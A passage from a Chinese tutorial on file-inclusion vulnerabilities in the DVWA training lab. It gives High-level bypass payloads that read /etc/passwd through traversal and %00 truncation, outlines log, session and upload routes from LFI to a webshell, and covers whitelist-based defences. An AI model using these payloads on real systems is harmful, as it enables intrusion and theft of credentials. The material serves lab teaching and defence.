| 2 | 绕过法 ②：**`file.`（当前目录`.`）+ 路径遍历**（fnmatch 只要开头 4 字符是 file，后面你接啥都行，`.` 指当前目录继续 ../ 遍历） | Linux：<br>`?page=file./../../../../etc/passwd`（注意 file 后面直接一个点一个斜杠，不要空格）<br>或者 `?page=file/../../../etc/passwd`（file 当作目录名，虽然不存在，但 include 会先过 fnmatch 再去路径遍历） | 显示 /etc/passwd 内容 ✅ | 【报错 include(file./../../): failed】→ ① fnmatch 过了（没出 ERROR: File name is not allowed 就是过了！）→ 现在是路径不对，多试几个 ../ 数量（4 个、6 个、8 个 ../）；② 有些 fnmatch 老版本对 `file*` 模式会要求 "file" 后面直接是文件名，所以 `file.` 不如 `file/` 稳，两个版本都试试 |
| 3 | 绕过法 ③：**PHP < 5.3.4 且 GPC = Off 经典 %00 截断**（老环境面试/CTF 常考，2026 年新环境基本无效，但考点必须会）| payload：<br>`?page=file/etc/passwd%00`（file 开头过 fnmatch，后面 `/etc/passwd` 接真实路径，再用 `%00` 让 PHP 字符串到此截断 → include 时只读到 `/etc/passwd`）<br>或：`?page=file%00../../../../etc/passwd` | 显示 /etc/passwd 内容 ✅ | 【页面显示 Warning include(file%00...): 没有那个文件】→ 你 PHP 版本 >= 5.3.4（2011 年之后的 PHP 就修了这个洞），或者 `magic_quotes_gpc = On` 把 `%00` 自动转义成 `\0`，这个方法就废了，**别在这个 payload 上耗时间，回到 ①② 就行**；想测这个就装 PHP 5.2.x 的古董靶场 |
| 4 | 绕过法 ④（Windows 专属，偏门考点）：**路径长度截断（_MAX_PATH = 260 字符自动截断）** | 写 `?page=file`，后面拼 `/./` 一共 259 个字符，最后再接 `/../../../etc/passwd`，总长度 > 260 时 Windows 自动截断 `.php` 这种后缀，相当于绕过 | 老 Windows + PHP 5.2 下会成功 | 【基本没人会遇到这种环境】→ 真实环境几乎不考，知道有这个思路就行，没成功直接跳过 |
| 5 | 还不行？直接拿 file1~3.php 当跳板读源码 + 分析有没有组合漏洞 | DVWA High 还留了 file1.php / file2.php / file3.php 是合法的（file 开头！）→ `?page=php://filter/convert.base64-encode/resource=file1.php` 虽然以 php: 开头过不了 fnmatch，但是如果有 **SSRF 或 CSRF** 能把参数转义就可以；或者切换到别的模块 XSS Stored / 上传漏洞拿 shell | 拿到 Webshell 之后直接读 `/etc/passwd`（不用再受 FI 限制了）| 【以上 4 种全失败 + 你真的想在 High FI 模块上硬刚】→ 先去 View Source 把那行 fnmatch 的**模式字符串**抄下来，仔细看是不是 `file*` 还是 `file*.php`（有些 DVWA fork 版本还加了后缀限制 → 那后缀也被限制，你必须让 file 开头 + .php 结尾，再配合 %00 截断或 file.php 目录遍历）|

> 🔥 **High 级别关键提示：** 只要不出那句 "ERROR: File name is not allowed." = 你已经在 fnmatch 上赢了，剩下的问题就是路径问题（../ 数量 / 绝对路径对不对），不是过滤问题。**看到 File name is not allowed → 一定是你前 4 个字符拼的不是 f-i-l-e 开头**，不用往别的地方想。

---

## 8.8 Impossible级别：看看正确的做法是什么

好了，打了三关了，咱们来看看 **Impossible** 级别——也就是"不可能被攻破"的级别，看看人家是怎么防御的。

### 8.8.1 看看源代码

直接上源码：

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```

看到了吗？Impossible级别用的是**白名单**！

代码写死了，只能包含这四个文件：
- `include.php`
- `file1.php`
- `file2.php`
- `file3.php`

除了这四个，其他的一律不允许。

这就是**白名单机制**——只允许指定的，其他全拒绝。

### 8.8.2 为什么白名单这么安全？

咱们之前遇到的Low、Medium、High级别，用的都是**黑名单**或者**限制条件**——也就是"我不让你干啥啥啥"。

黑名单的问题在于：你永远不可能把所有危险情况都列出来，总会有漏掉的，总会有绕过的方法。

而白名单正好相反——"我只允许你干啥啥啥，其他的全不行"。

就像小区门口的保安：
- **黑名单**："张三不能进，李四不能进，其他人都能进"——总有漏掉的坏人
- **白名单**："只有业主能进，其他人都不能进"——安全多了

显然，白名单要安全得多！

所以，**正确的防御方式就是用白名单**。这也是为什么Impossible级别叫"Impossible"——因为用了白名单，基本上不可能被绕过。

---

## 8.9 文件包含漏洞的危害有多大？

讲了这么多攻击方法，小伙伴们可能会问：文件包含漏洞到底有多危险？能造成什么危害？

我来给大家捋一捋：

### 8.9.1 读取敏感信息

这是最基本的，LFI就能做到：
- 读取配置文件 → 拿到数据库账号密码
- 读取源代码 → 发现更多漏洞
- 读取 `/etc/passwd` → 知道系统有哪些用户
- 读取日志文件 → 了解网站访问情况
- 读取 `.bash_history` → 知道管理员都敲过什么命令
- ……

只要是服务器上的文件，只要权限够，都能读。

### 8.9.2 执行任意代码

如果运气好，有RFI（远程文件包含），那直接就能执行任意PHP代码，GetShell就是分分钟的事。

就算没有RFI，只有LFI，也有很多方法可以执行代码：
- **配合文件上传**：上传一个图片马，然后用LFI包含它
- **包含日志文件**：如果能把PHP代码写到日志文件里（比如访问日志、错误日志），然后用LFI包含日志文件，就能执行代码
- **包含session文件**：如果能把PHP代码写到session里，然后包含session文件
- **用 phar:// 伪协议**：包含压缩包里的PHP文件
- ……

总之，只要有LFI，再配合其他条件，执行代码的可能性是非常大的。

### 8.9.3 内网渗透的跳板

如果拿到了webshell，那就可以把这台服务器当跳板，进行内网渗透：
- 扫内网其他机器
- 攻击内网其他服务
- 横向移动，扩大战果

所以说，文件包含漏洞的危害是非常大的，不容忽视！

---

## 8.10 防御方法：怎么防文件包含漏洞？

讲了这么多攻击，咱们也得说说怎么防御。毕竟学攻击是为了更好地防御嘛。

### 8.10.1 白名单机制（最推荐！）

这是最有效、最安全的方法——**使用白名单，只允许包含指定的文件**。

就像Impossible级别那样：
```php
<?php
$file = $_GET['page'];
$allow_files = ['file1.php', 'file2.php', 'file3.php'];
if (!in_array($file, $allow_files)) {
    die('非法文件');
}
include($file);
?>
```

简单直接，效果拔群！只要白名单列全了，基本不可能被绕过。

### 8.10.2 关闭 allow_url_include

这个简单，在 `php.ini` 里设置：
```ini
allow_url_include = Off
```

这样就能防止远程文件包含（RFI）了。默认就是Off，所以只要不改它就行。

### 8.10.3 不要让用户控制文件名

最好的方法是：**根本不要让用户去控制包含哪个文件**。

如果业务需要动态选择文件，可以用数字或者编号来代替文件名，比如：
- `?page=1` → 包含 `file1.php`
- `?page=2` → 包含 `file2.php`
- ……

后台用switch或者数组映射一下，用户根本接触不到真实的文件名。

### 8.10.4 对用户输入进行严格过滤和验证

如果实在要让用户传文件名，那就要做好过滤：
- 过滤掉 `../`、`..\` 等目录遍历字符
- 限制只能在某个目录下（比如用 `basename()` 函数只取文件名）
- 检查文件是否真的在允许的目录里

比如：
```php
<?php
$file = $_GET['page'];
$base_dir = '/var/www/html/pages/';  // 只允许包含这个目录下的文件
$real_file = realpath($base_dir . $file);  // 取得真实路径
if (strpos($real_file, $base_dir) !== 0) {  // 检查真实路径是否在允许的目录里
    die('非法文件');
}
include($real_file);
?>
```

不过要注意，这些方法都不如白名单可靠。

### 8.10.5 升级PHP版本

把PHP升级到最新版本，很多老的绕过方法（比如%00截断）在新版本里都没用了。

---

## 8.11 新手常见问题FAQ

学了这么多，大家可能还有一些疑问。我整理了一些新手常问的问题，统一解答一下。

### Q1：文件包含漏洞和文件读取漏洞是一回事吗？

**A：** 不完全一样，但有联系。

- **文件读取漏洞**：只能读取文件内容，不能执行
- **文件包含漏洞**：不仅能读文件，如果文件里有PHP代码，还会被执行

所以文件包含漏洞比单纯的文件读取漏洞更危险，因为它可能导致代码执行。

### Q2：为什么我用php://filter读出来是空的？

**A：** 可能有几个原因：
1. 文件不存在或路径写错了
2. 文件权限不够，PHP读不到
3. 文件确实是空的
4. 伪协议被禁用了

建议先确认文件路径对不对，权限够不够。

### Q3：LFI怎么GetShell？只有LFI没有上传点怎么办？

**A：** 这是个好问题。只有LFI的情况下，可以尝试以下几种方法：
1. **包含日志文件**：想办法把PHP代码写到日志里（比如访问一个不存在的页面，URL里写PHP代码，有些服务器会把URL记到日志里），然后包含日志文件
2. **包含session文件**：如果能控制session的内容，把PHP代码写进去，然后包含session文件
3. **包含环境变量文件**：比如 `/proc/self/environ`（Linux下），如果里面有可控的内容
4. **包含上传的临时文件**：这个比较难，需要知道临时文件名

这些方法都比较高级，而且不一定都能成功。新手先把基础的学会，后面慢慢接触高级的。

### Q4：文件包含和文件上传哪个更厉害？

**A：** 没有"更厉害"之分，它们是不同的漏洞类型，各有各的用处。而且它们经常配合使用——文件上传负责"把代码放上去"，文件包含负责"把代码执行起来"，是经典的组合拳。

### Q5：为什么我测试%00截断没用？

**A：** 大概率是因为你的PHP版本太高了。%00截断只在PHP 5.3.4以下的版本有效，现在的PHP版本都修复了这个问题。知道这个知识点就行，实战中已经很少见了。

---

## 8.12 本章总结

好了小伙伴们，这一章咱们讲了好多好多内容，来总结一下，看看你都学会了啥。

### 8.12.1 我们学到了什么？

1. **什么是文件包含漏洞**：用户能控制包含的文件名，导致能读敏感文件或执行恶意代码
2. **PHP的四个文件包含函数**：`include()`、`require()`、`include_once()`、`require_once()`
3. **LFI和RFI**：
   - LFI（本地文件包含）：读服务器本地文件
   - RFI（远程文件包含）：加载远程文件执行（需要allow_url_include开启）
4. **Low级别**：啥过滤都没有，直接改page参数就行
5. **PHP伪协议（重点！）**：
   - `php://filter`：读PHP源码神器（Base64编码输出）
   - `php://input`：POST数据当PHP代码执行
   - `data://`：直接在URL里写代码执行
   - `phar://`、`zip://`：压缩包文件包含
6. **Medium级别**：
   - 过滤http:// → 大小写绕过、换协议
   - 过滤../ → 双写绕过、编码绕过
7. **High级别**：限制文件名开头 → file://协议、%00截断等
8. **Impossible级别**：白名单机制，最安全
9. **漏洞危害**：读敏感文件、执行代码、内网渗透
10. **防御方法**：白名单、关闭allow_url_include、不要让用户控文件名

### 8.12.2 学习建议

给新手小伙伴们几点学习建议：

1. **伪协议一定要记牢**：特别是 `php://filter`，太常用了
2. **多动手实操**：每个级别都自己打一遍，每个伪协议都自己试一遍
3. **理解原理，不要死记硬背**：知道为什么能绕过，比记住payload更重要
4. **扩展知识面**：文件包含经常和其他漏洞配合使用，后面学了文件上传、SQL注入等，可以回头想想怎么组合

### 8.12.3 下章预告

文件包含漏洞咱们就讲到这儿了。下一章，咱们将学习另一个超级经典的漏洞——**文件上传漏洞**！

文件上传漏洞是什么？一句话：**把你的PHP木马上传到服务器上，然后直接访问，就能GetShell！**

是不是更刺激？😏

文件上传漏洞里也有各种花式绕过：前端校验绕过、MIME类型绕过、黑名单绕过、.htaccess绕过、图片马绕过……保证让你大开眼界！

准备好了吗？咱们下一章见！👋
